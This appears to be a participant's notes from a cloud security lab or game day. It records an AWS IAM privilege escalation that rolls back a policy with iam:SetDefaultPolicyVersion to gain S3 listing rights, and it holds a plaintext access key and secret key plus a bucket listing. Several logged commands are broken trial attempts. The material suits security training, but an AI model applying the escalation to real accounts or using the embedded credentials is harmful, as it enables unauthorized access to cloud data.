Scenario 1

Dear Vasyl Ostapenko,
Welcome to the first task.

You are starting with a user with limited permissions. Using all your skills and knowledge, get permissions to s3 buckets list. To finalize the scenario - run command "aws s3 ls --profile your_profile_name"

Task goal: Get permissions to list s3 buckets.
Link format: https://[bucket-name].s3.[region].amazonaws.com/index.html

Resources:

IAM
S3
Credentials:

Access key: AKIA36D6ZZWU4C4HBHOR
Sekret key: FASmxfPu6tPiQlhsA7B3O0E886gHwNv0rBgcwtEr
Username: scenario1_vasyl_ostapenko

**********************************************

aws iam --profile sc1 get-user-policy --user-name scenario1_vasyl_ostapenko --policy-name SetDefaultPolicyVersion

{
    "UserName": "scenario1_vasyl_ostapenko",
    "PolicyName": "SetDefaultPolicyVersion",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "IAMPrivilegeEscalationByRollback",
                "Effect": "Allow",
                "Action": "iam:SetDefaultPolicyVersion",
                "Resource": "arn:aws:iam::820604685737:policy/policy_scenario1_vasyl_ostapenko"
            }
        ]
    }
}

aws iam --profile sc1 get-user-policy --user-name scenario1_vasyl_ostapenko --policy-name 

aws   iam --profile sc1 ls s3 arn:aws:iam::820604685737:policy/policy_scenario1_vasyl_ostapenko

aws  list-policy-version iam --profile sc1 ls s3 arn:aws:iam::820604685737:policy/policy_scenario1_vasyl_ostapenko

aws s3 ls --profile sc1 list-policy-versions

aws iam  --profile sc1 get-policy-version --policy-arn arn:aws:iam::820604685737:policy/policy_scenario1_vasyl_ostapenko  --version-id v1

aws iam  --profile sc1 get-policy-version --policy-arn arn:aws:iam::820604685737:policy/policy_scenario1_vasyl_ostapenko  --version-id v5

aws iam set-default-policy-version --policy-arn arn:aws:iam::820604685737:policy/policy_scenario1_vasyl_ostapenko --version-id v5 --profile sc1

aws s3 ls --profile sc1

 aws s3 ls --profile sc1
2021-12-17 20:46:04 gameday-dashboard
2021-12-17 20:54:57 sc2-government-data
2020-01-23 13:41:17 simplejspwebapp
2021-11-09 14:11:06 startermk1
2021-12-17 20:46:04 templates-hackaton-notify

https://gameday-dashboard.s3.eu-central-1.amazonaws.com/index.html

aws configure set aws_access_key_id default_access_key
















